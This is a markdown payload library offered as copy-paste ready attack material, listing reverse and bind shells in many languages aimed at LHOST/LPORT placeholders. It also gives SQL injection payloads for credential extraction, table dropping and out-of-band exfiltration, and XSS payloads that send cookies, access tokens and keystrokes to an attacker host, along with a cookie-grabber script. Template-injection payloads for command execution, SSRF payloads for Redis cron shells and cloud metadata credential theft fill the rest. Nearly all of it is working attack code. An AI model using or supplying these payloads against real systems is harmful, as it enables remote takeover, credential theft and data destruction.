# KILLER QUEEN PAYLOAD LIBRARY
## Copy-Paste Ready Payloads — LHOST/LPORT Placeholders
### Generated from PayloadsAllTheThings, HackTricks, PortSwigger, and H1 Writeups

---

## REVERSE SHELLS

### Bash
```bash
bash -i >& /dev/tcp/LHOST/LPORT 0>&1
bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'
exec 5<>/dev/tcp/LHOST/LPORT;cat <&5 | while read line; do $line 2>&5 >&5; done
0<&196;exec 196<>/dev/tcp/LHOST/LPORT; sh <&196 >&196 2>&196
```

### Bash (short)
```bash
(sh)0>/dev/tcp/LHOST/LPORT
exec >&0
```

### Python
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### Python3
```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### Python3 (short)
```python
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("LHOST",LPORT));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/sh")'
```

### PHP
```php
php -r '$sock=fsockopen("LHOST",LPORT);exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("LHOST",LPORT);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("LHOST",LPORT);system("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("LHOST",LPORT);passthru("/bin/sh -i <&3 >&3 2>&3");'
```

### Perl
```perl
perl -e 'use Socket;$i="LHOST";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Perl (no sh)
```perl
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"LHOST:LPORT");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

### Ruby
```ruby
ruby -rsocket -e 'f=TCPSocket.open("LHOST",LPORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("LHOST","LPORT");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

### Netcat (traditional)
```bash
nc -e /bin/sh LHOST LPORT
nc -e /bin/bash LHOST LPORT
```

### Netcat (OpenBSD / no -e)
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST LPORT >/tmp/f
```

### Netcat (mkfifo variant)
```bash
mknod /tmp/backpipe p && nc LHOST LPORT 0</tmp/backpipe | /bin/bash 1>/tmp/backpipe
```

### PowerShell
```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object net.sockets.tcpclient('LHOST',LPORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$s2=([text.encoding]::ASCII).GetBytes($sb+'> ');$s.Write($s2,0,$s2.Length);$s.Flush()};$c.Close()"
```

### PowerShell (Base64 encoded)
```powershell
powershell -e JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAG4AZQB0AC4AcwBvAGMAawBlAHQAcwAuAHQAYwBwAGMAbABpAGUAbgB0ACgAJwBMAEgATwBTAFQAJwAsAEwAUABPAFIAVAApADsAJABzAD0AJABjAC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgA9ADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQA9ACQAcwAuAFIAZQBhAGQAKAAkAGIALAAwACwAJABiAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewAkAGQAPQAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIALAAwACwAJABpACkAOwAkAHMAYgA9ACgAaQBlAHgAIAAkAGQAIAAyAD4AJgAxAHwATwB1AHQALQBTAHQAcgBpAG4AZwApADsAJABzADIAPQAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBiACsAJwA+ACAAJwApADsAJABzAC4AVwByAGkAdABlACgAJABzADIALAAwACwAJABzADIALgBMAGUAbgBnAHQAaAApADsAJABzAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAC4AQwBsAG8AcwBlACgAKQA=
```

### Node.js
```javascript
node -e "(function(){var net=require('net'),cp=require('child_process'),sh=cp.spawn('/bin/sh',[]);var c=new net.Socket();c.connect(LPORT,'LHOST',function(){c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c);});return /a/;})()"
```

### Java (oneliner compile+run)
```bash
echo 'public class R{public static void main(String[]a)throws Exception{String h="LHOST";int p=LPORT;Process pr=Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","exec 5<>/dev/tcp/"+h+"/"+p+";cat <&5|while read line;do $line 2>&5>&5;done"});}}' > /tmp/R.java && cd /tmp && javac R.java && java R
```

### Go
```bash
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","LHOST:LPORT");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/r.go && go run /tmp/r.go
```

### Lua
```lua
lua -e "local s=require('socket');local t=assert(s.tcp());t:connect('LHOST',LPORT);while true do local r,x=t:receive();local f=assert(io.popen(r,'r'));local b=assert(f:read('*a'));t:send(b);end"
```

### Lua (oneliner)
```bash
lua5.1 -e 'local host,port="LHOST",LPORT;local s=require("socket");local t=assert(s.tcp());t:connect(host,port);while true do local r,x=t:receive();local f=assert(io.popen(r,"r"));local b=assert(f:read("*a"));t:send(b);end;'
```

### AWK
```bash
awk 'BEGIN{s="/inet/tcp/0/LHOST/LPORT";while(1){do{s|&getline c;if(c){while((c|&getline)>0)print $0|&s;close(c)}}while(c!="exit");close(s)}}'
```

### Rust
```bash
echo 'use std::net::TcpStream;use std::os::unix::io::FromRawFd;use std::process::{Command,Stdio};fn main(){let s=TcpStream::connect("LHOST:LPORT").unwrap();let fd=s.as_raw_fd();Command::new("/bin/sh").arg("-i").stdin(unsafe{Stdio::from_raw_fd(fd)}).stdout(unsafe{Stdio::from_raw_fd(fd)}).stderr(unsafe{Stdio::from_raw_fd(fd)}).spawn().unwrap().wait().unwrap();}' > /tmp/r.rs && rustc /tmp/r.rs -o /tmp/r && /tmp/r
```

### Socat
```bash
socat TCP:LHOST:LPORT EXEC:/bin/sh
socat TCP:LHOST:LPORT EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

### Telnet
```bash
TF=$(mktemp -u);mkfifo $TF && telnet LHOST LPORT 0<$TF | /bin/sh 1>$TF;rm $TF
```

### Xterm
```bash
xterm -display LHOST:1
```

### Double-Base64 (avoids bad chars)
```bash
echo "echo $(echo 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h"
```

---

## BIND SHELLS

### Bash
```bash
bash -c 'while true; do nc -l -p LPORT -e /bin/sh; done'
```

### Netcat
```bash
nc -l -p LPORT -e /bin/sh
nc -l -p LPORT -e /bin/bash
```

### Netcat (OpenBSD)
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -l LPORT >/tmp/f
```

### Python
```python
python -c 'import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("0.0.0.0",LPORT));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);os.system("/bin/sh -i")'
```

### Python3
```python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.bind(("0.0.0.0",LPORT));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### PHP
```php
php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",LPORT);socket_listen($s);$c=socket_accept($s);socket_dup($c);exec("/bin/sh -i");'
```

### Perl
```perl
perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));setsockopt(S,SOL_SOCKET,SO_REUSEADDR,1);bind(S,sockaddr_in(LPORT,INADDR_ANY));listen(S,1);while(accept(C,S)){open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/sh -i");};'
```

### Ruby
```ruby
ruby -rsocket -e 's=TCPServer.new(LPORT);c=s.accept;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",c.to_i,c.to_i,c.to_i)'
```

### PowerShell
```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$l=New-Object net.sockets.tcplistener(LPORT);$l.Start();$c=$l.AcceptTcpClient();$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$s2=([text.encoding]::ASCII).GetBytes($sb+'> ');$s.Write($s2,0,$s2.Length);$s.Flush()};$c.Close();$l.Stop()"
```

### Node.js
```javascript
node -e "var net=require('net'),cp=require('child_process');net.createServer(function(c){var sh=cp.spawn('/bin/sh',[]);c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c);}).listen(LPORT)"
```

### Socat
```bash
socat TCP-LISTEN:LPORT,reuseaddr,fork EXEC:/bin/sh
```

---

## SQL INJECTION

### Authentication Bypass
```sql
' OR '1'='1'--
' OR '1'='1'#
' OR '1'='1'/*
' or 1=1 limit 1 --
admin'--
admin' #
admin'/*
') OR ('1'='1
')) OR (('1'='1
')) OR (('1'='1')) LIMIT 1 --
' OR 1=1 ORDER BY 1--
```

### Raw MD5/SHA1 Bypass (PHP md5($pass,true))
```
MD5 input: ffifdyop  →  output: 'or'6... (escapes context)
SHA1 input: 3fDf    →  output contains '='
```

### UNION Based — Column Count Detection
```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT NULL,NULL,NULL,NULL--
' UNION SELECT NULL,NULL,NULL,NULL,NULL--
```

### UNION Based — Data Extraction
```sql
' UNION SELECT 1,2,3--
' UNION SELECT 1,@@version,3--
' UNION SELECT 1,user(),3--
' UNION SELECT 1,database(),3--
' UNION SELECT 1,table_name,3 FROM information_schema.tables--
' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users--
```

### PostgreSQL Specific
```sql
' UNION SELECT NULL,version(),NULL--
' UNION SELECT NULL,current_database(),NULL--
' UNION SELECT NULL,string_agg(table_name,','),NULL FROM information_schema.tables--
' UNION SELECT NULL,string_agg(column_name,','),NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT NULL,string_agg(username||':'||password,','),NULL FROM users--
```

### MSSQL Specific
```sql
' UNION SELECT NULL,@@version,NULL--
' UNION SELECT NULL,db_name(),NULL--
' UNION SELECT NULL,name,NULL FROM sys.databases--
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--
' UNION SELECT NULL,STRING_AGG(column_name,','),NULL FROM information_schema.columns WHERE table_name='users'--
```

### Oracle Specific
```sql
' UNION SELECT NULL,banner,NULL FROM v$version--
' UNION SELECT NULL,table_name,NULL FROM all_tables--
' UNION SELECT NULL,column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--
' UNION SELECT NULL,username||':'||password,NULL FROM users--
```

### SQLite Specific
```sql
' UNION SELECT NULL,sqlite_version(),NULL--
' UNION SELECT NULL,sql,NULL FROM sqlite_master--
' UNION SELECT NULL,group_concat(name),NULL FROM sqlite_master WHERE type='table'--
' UNION SELECT NULL,group_concat(sql),NULL FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name='users'--
```

### Error Based — MySQL
```sql
' AND extractvalue(1,concat(0x7e,(SELECT version())))-- 
' AND updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)--
' AND (SELECT * FROM (SELECT count(*),concat((SELECT database()),floor(rand()*2))x FROM information_schema.tables GROUP BY x)a)--
' AND GTID_SUBSET(CONCAT(0x7e,(SELECT database()),0x7e),0)--
```

### Error Based — PostgreSQL
```sql
' OR 1=CAST((SELECT version()) AS int)--
' OR 1=CAST((SELECT current_database()) AS int)--
```

### Error Based — MSSQL
```sql
' AND 1=CONVERT(int,(SELECT @@version))--
' AND 1=CONVERT(int,(SELECT DB_NAME()))--
```

### Blind Boolean — Generic
```sql
' AND 1=1--     # True
' AND 1=2--     # False
' AND SUBSTRING((SELECT database()),1,1)='a'--
' AND (SELECT LENGTH(database()))=5--
' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--
```

### Blind Boolean — PostgreSQL
```sql
' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 1/(SELECT 0) END)=1--
' AND (SELECT SUBSTRING(current_database(),1,1))='a'--
```

### Blind Time-Based — MySQL
```sql
' AND SLEEP(5)--
' AND IF(SUBSTRING((SELECT database()),1,1)='a',SLEEP(5),0)--
' AND (SELECT IF(ASCII(SUBSTRING((SELECT database()),1,1))>64,SLEEP(5),0))--
```

### Blind Time-Based — PostgreSQL
```sql
' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--
' AND (SELECT CASE WHEN (SUBSTRING(current_database(),1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END)--
```

### Blind Time-Based — MSSQL
```sql
' AND (SELECT CASE WHEN (1=1) THEN 'a' ELSE char(0) END)=0 WAITFOR DELAY '0:0:5'--
' IF (SUBSTRING(@@version,1,1)='M') WAITFOR DELAY '0:0:5'--
```

### Stacked Queries
```sql
'; SELECT SLEEP(5)--
'; DROP TABLE users--
'; INSERT INTO users VALUES('hacker','password123')--
'; UPDATE users SET password='newpass' WHERE username='admin'--
```

### Out-of-Band (OOB) — MySQL (Windows)
```sql
' UNION SELECT LOAD_FILE(concat('\\\\',(SELECT database()),'.LHOST\\a.txt'))--
```

### Out-of-Band (OOB) — MSSQL
```sql
'; EXEC master..xp_dirtree '\\LHOST\share'--
'; DECLARE @a varchar(1024); SET @a='\\LHOST\'+(SELECT DB_NAME()); EXEC master..xp_dirtree @a--
```

### Out-of-Band (OOB) — PostgreSQL
```sql
'; DROP TABLE IF EXISTS cmd_exec;CREATE TABLE cmd_exec(cmd_output text);COPY cmd_exec FROM PROGRAM 'nslookup $(whoami).LHOST';--
```

### Polyglot SQLi
```sql
SLEEP(1) /*' SLEEP(1) */ 'SLEEP(1) "SLEEP(1)--
```

### WAF Bypass — No Spaces
```sql
'/**/OR/**/1=1--
'%09OR%091=1--
'%0aOR%0a1=1--
'%0dOR%0d1=1--
'%0cOR%0c1=1--
'%a0OR%a01=1--
```

### WAF Bypass — No Commas
```sql
' UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c--
' AND SUBSTRING(database() FROM 1 FOR 1)='a'--
' AND MID(database() FROM 1 FOR 1)='a'--
```

### WAF Bypass — No Equals
```sql
' OR 1 LIKE 1--
' OR 1 BETWEEN 1 AND 1--
' OR 'a' IN ('a')--
' OR 1>0--
```

### WAF Bypass — Case Variation
```sql
' UnIoN SeLeCt 1,2,3--
' uNioN sEleCt 1,2,3--
```

### WAF Bypass — Comment Obfuscation
```sql
'/**/UNI/**/ON/**/SELE/**/CT/**/1,2,3--
'/**!50000UNION/**//**!50000SELECT/**/1,2,3--
```

---

## XSS PAYLOADS

### Basic Payloads
```html
<script>alert(1)</script>
<script>alert(document.domain)</script>
<script>alert(document.cookie)</script>
<img src=x onerror=alert(1)>
<img src=x onerror=alert(document.cookie)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src=javascript:alert(1)>
```

### Event Handler Payloads
```html
" autofocus onfocus=alert(1) x="
" onfocus=alert(1) id=x tabindex=0 style=display:block>#x
" onmouseover=alert(1)
" onanimationstart=alert(1)
" onanimationend=alert(1)
" onpointerover=alert(1)
" onpointerdown=alert(1)
" onpointerenter=alert(1)
" onpointerleave=alert(1)
```

### SVG Payloads
```html
<svg onload=alert(1)>
<svg/onload=alert(1)>
<svg/onload=alert(String.fromCharCode(88,83,83))>
<svg><script>alert(1)</script></svg>
<svg><script href=data:,alert(1) />
<svg id=alert(1) onload=eval(id)>
```

### HTML5 Tag Payloads
```html
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<video poster=/ onerror=alert(1)>
<video><source onerror="javascript:alert(1)">
<video src=_ onloadstart="alert(1)">
<details open ontoggle="alert(1)">
<audio src onloadstart=alert(1)>
<marquee onstart=alert(1)>
<meter value=2 min=0 max=10 onmouseover=alert(1)>2 out of 10</meter>
```

### Invisible Overlay (UI Redressing / Clickjacking via XSS)
```html
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.5);z-index: 5000;" onclick="alert(1)"></div>
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.0);z-index: 5000;" onmouseover="alert(1)"></div>
```

### Login Form UI Redressing
```html
<script>
history.replaceState(null, null, '../../../login');
document.body.innerHTML = "</br></br></br></br></br><h1>Please login to continue</h1><form>Username: <input type='text'>Password: <input type='password'></form><input value='submit' type='submit'>"
</script>
```

### Cookie Theft
```html
<script>document.location='http://LHOST/grabber.php?c='+document.cookie</script>
<script>new Image().src="http://LHOST/cookie.php?c="+document.cookie</script>
<script>fetch('http://LHOST',{method:'POST',mode:'no-cors',body:document.cookie})</script>
```

### LocalStorage / Access Token Theft
```html
<script>document.location='http://LHOST/grab.php?c='+localStorage.getItem('access_token')</script>
<script>new Image().src="http://LHOST/grab.php?c="+localStorage.getItem('access_token')</script>
```

### Keylogger
```html
<img src=x onerror='document.onkeypress=function(e){fetch("http://LHOST/?k="+String.fromCharCode(e.which))},this.remove();'>
```

### Blind XSS Payloads
```html
<script src=http://LHOST/xss.js></script>
"></script><script src=http://LHOST/xss.js></script>
```

### Polyglot XSS
```html
javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"+/+/onmouseover=1/+/[*/[]/+alert(1)//'>
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(1)//>\x3e
```

### DOM XSS
```html
#"><img src=/ onerror=alert(2)>
#"><svg/onload=alert(2)>
```

### JS Context Escapes
```javascript
-(confirm)(document.domain)//
; alert(1);//
\'-alert(document.domain)-'
';alert(document.domain)//
\';alert(document.domain)//
```

### Template Literals
```javascript
;`${alert(1)}`
;`${`${`${`${alert(1)}`}`}`}`;
```

### JS-in-JS Injection Pattern
```
"            // end original string
;            // safely terminate
alert(1)     // injection
; a ="       // repair
```

### javascript: Protocol Payloads
```html
javascript:alert(1)
javascript:prompt(1)
javascript:alert(document.cookie)
<a href="javascript:alert(1)">click</a>
<form action="javascript:alert(1)"><button>send</button></form>
<iframe src=javascript:alert(1)>
<embed src=javascript:alert(1)>
<object data=javascript:alert(1)>
```

### javascript: Bypasses
```
JavaSCript:alert(1)
javascript:%61%6c%65%72%74%28%31%29
javascript&colon;alert(1)
javascript&#x003A;alert(1)
javascript&#58;alert(1)
java%0ascript:alert(1)
```

### data: Protocol Payloads
```html
data:text/html,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
<iframe src="data:text/html,<script>alert(5)</script>"></iframe>
<object data="data:text/html,<script>alert(5)</script>">
<embed src="data:text/html;base64,..." type="image/svg+xml" AllowScriptAccess="always">
<iframe srcdoc="<svg onload=alert(4);>">
```

### Blacklist Bypasses
```html
<ScRipT>alert(1)</ScRipT>
<scr<script>ipt>alert(1)</scr<script>ipt>
<scr\x00ipt>alert(1)</scr\x00ipt>
<script/random>alert(1)</script>
<script x>alert(1)</script>
<script ~~~>alert(1)</script>
<<script>alert(1);//<</script>
```

### Tiny XSS Payloads
```html
<svg/onload=alert``>
<script src=//aa.es>
<script src=//℡㏛.pw>
```

### Uppercase-Only XSS
```html
<IMG SRC=1 ONERROR=&#X61;&#X6C;&#X65;&#X72;&#X74;(1)>
```

### Hidden Input XSS
```html
<input type="hidden" accesskey="X" onclick="alert(1)">
<input type="hidden" oncontentvisibilityautostatechange="alert(1)" style="content-visibility:auto">
```

### Style/Link-Based CSS Context XSS
```html
<p style="animation: x;" onanimationstart="alert()">XSS</p>
<p style="animation: x;" onanimationend="alert()">XSS</p>
```

### Remote JS Include
```html
<script src=http://LHOST/xss.js></script>
<svg/onload='fetch("//LHOST/a").then(r=>r.text().then(t=>eval(t)))'>
```

### Grabber Script (server-side, PHP)
```php
<?php
$cookie = $_GET['c'];
$fp = fopen('cookies.txt', 'a+');
fwrite($fp, 'Cookie:' .$cookie."\r\n");
fclose($fp);
?>
```

### XSS in CSS Context
```css
body { background: url("javascript:alert(1)") }
@import url("javascript:alert(1)");
```

### XSS in SVG File
```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" xmlns="http://www.w3.org/2000/svg">
<script>alert(1)</script>
</svg>
```

---

## SSTI PAYLOADS

### Detection Polyglot
```
${{<%[%'"}}%\.
```

### Mathematical Tests
```
{{7*7}}        # Jinja2/Twig: 49; Jinja2 with {{7*'7'}}: 7777777
${7*7}         # Freemarker: 49
<%= 7*7 %>     # ERB: 49
#{7*7}         # Pug: 49
```

### Error-Based Detection
```
{{(1/0).zxy.zxy}}
```

---

### Jinja2 (Python) — RCE
```python
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ ''.__class__.__mro__[1].__subclasses__() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ lipsum.__globals__["os"].popen('id').read() }}
{{ request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')|attr('popen')('id')|attr('read')() }}
{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}

# Reverse shell via Jinja2
{{ self.__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/LHOST/LPORT 0>&1"').read() }}
```

### Twig (PHP) — RCE
```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id;uname -a;hostname")}}
{{['id']|filter('system')}}
{{['cat /etc/passwd']|filter('system')}}
{{['cat\x20/etc/passwd']|filter('system')}}
{{['cat$IFS/etc/passwd']|filter('system')}}
{{['id',""]|sort('system')}}

# File read
"{{'/etc/passwd'|file_excerpt(1,30)}}"@

# Reverse shell via Twig
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'")}}
```

### Freemarker (Java) — RCE
```java
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
${\"freemarker.template.utility.Execute\"?new()(\"id\")}
${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder","id")}

# Sandbox bypass (< 2.3.30)
<#assign classloader=article.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("id")}
```

### Velocity (Java) — RCE
```java
#set($s="")
#set($stringClass=$s.getClass())
#set($runtime=$stringClass.forName("java.lang.Runtime").getRuntime())
#set($process=$runtime.exec("cat /etc/passwd"))
#set($out=$process.getInputStream())
#set($null=$process.waitFor())
#foreach($i in [1..$out.available()])
$out.read()
#end
```

### ERB (Ruby) — RCE
```erb
<%= system("id") %>
<%= `id` %>
<%= IO.popen("id").readlines() %>
<%= IO.popen("bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'").readlines() %>
```

### ASP.NET Razor (.NET) — RCE
```csharp
@System.Diagnostics.Process.Start("cmd.exe","/c whoami")
@{ System.Diagnostics.Process.Start("cmd.exe","/c calc"); }
```

### Smarty (PHP) — RCE
```php
{$smarty.version}
{php}echo `id`;{/php}
{system('ls')}
{system('cat /etc/passwd')}
{system('bash -c "bash -i >& /dev/tcp/LHOST/LPORT 0>&1"')}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
```

### Pug (Node.js) — RCE
```javascript
#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('id')}()}
```

### Handlebars (Node.js) — RCE
```javascript
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('id');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

### Mustache (logic-less, limited)

### Thymeleaf (Java)
```java
${T(java.lang.Runtime).getRuntime().exec('calc')}
[[${7*7}]]
__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x
```

### Spring Framework (Java)
```java
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
__${T(java.lang.Runtime).getRuntime().exec("touch executed")}__::.x
```

### Jinjava / HubSpot (Java)
```java
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval("new java.lang.String('xxx')")}}
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval("var x=new java.lang.ProcessBuilder; x.command(\"whoami\"); x.start()")}}
```

### Groovy (Java)
```java
import groovy.*;
@groovy.transform.ASTTest(value={
    cmd = "ping cq6qwx76mos92gp9eo7746dmgdm5au.burpcollaborator.net "
    assert java.lang.Runtime.getRuntime().exec(cmd.split(" "))
})
def x
```

---

## SSRF PAYLOADS

### file:// Protocol
```
file:///etc/passwd
file:///etc/hosts
file:///c:/windows/win.ini
file:///c:/boot.ini
```

### dict:// Protocol
```
dict://localhost:22
dict://localhost:6379/info
dict://localhost:11211/stat
```

### gopher:// Protocol
```
gopher://LHOST:LPORT/_GET / HTTP/1.0%0a%0a
gopher://LHOST:LPORT/_POST /post HTTP/1.0%0aContent-Length: 7%0a%0abody=hi
```

### SFTP / TFTP
```
sftp://LHOST:LPORT/
tftp://LHOST:LPORT/file.txt
```

### LDAP
```
ldap://localhost:389/%0astats%0aquit
ldap://LHOST:LPORT/cn=admin,dc=example,dc=com
```

### Gopher — Redis RCE
```
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a
```

### Cloud Metadata Endpoints

#### AWS
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
http://169.254.169.254/latest/dynamic/instance-identity/document
http://instance-data/latest/meta-data/
http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance
```

#### GCP
```
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes
# Header required: Metadata-Flavor: Google
```

#### Azure
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01
